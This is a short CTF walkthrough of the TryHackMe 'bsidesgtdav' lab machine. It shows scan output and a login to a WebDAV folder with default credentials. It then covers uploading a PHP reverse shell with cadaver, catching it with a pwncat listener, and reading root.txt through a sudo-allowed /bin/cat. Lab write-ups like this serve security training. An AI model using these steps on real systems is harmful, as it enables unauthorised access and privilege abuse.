---
title: Walkthrough - Dav
published: true
---

Tags: Security.
Description: Boot2root machine for FIT and bsides guatemala CTF.
Difficulty: Easy

[bsidesgtdav](https://tryhackme.com/room/bsidesgtdav)

* * *

## Notes

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
```

- `gobuster dir -u http://10.10.59.127/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -t 100 -x txt,html,php`

Running gobuster finds us a `/webdav` directory. It's a protected folder however. WebDAV is a protocol that provides a framework for users to manipulate documents on a server, such as creating or moving or changing them. 

Find default credentials through google wampp:xampp

Loggin in we get the contents of the directory.

We can use `cadaver` on kali to upload a shell

```
┌──(0xskar㉿cocokali)-[~/Documents/TryHackMe/bsidesgtdav]
└─$ cadaver http://10.10.112.23/webdav/ 
Authentication required for webdav on server `10.10.112.23':
Username: wampp
Password: 
dav:/webdav/> put ~/scripts/php-reverse-shell.php
Uploading ~/scripts/php-reverse-shell.php to `/webdav/php-reverse-shell.php': Could not open file: No such file or directory
dav:/webdav/> put /home/oskar/scripts/php-reverse-shell.php
Uploading /home/oskar/scripts/php-reverse-shell.php to `/webdav/php-reverse-shell.php':
Progress: [=============================>] 100.0% of 2585 bytes succeeded.
```

- setup pwncat listener and recieve shell `pwncat-cs -lp 6666`

* * * 

## What is the content of user.txt?

![0xskar](/assets/bsidesgtdav01.png)

* * * 

## What is the content of root.txt?

```
(remote) www-data@ubuntu:/home/merlin$ sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL) NOPASSWD: /bin/cat
(remote) www-data@ubuntu:/home/merlin$ sudo cat /root/root.txt
```

* * * 

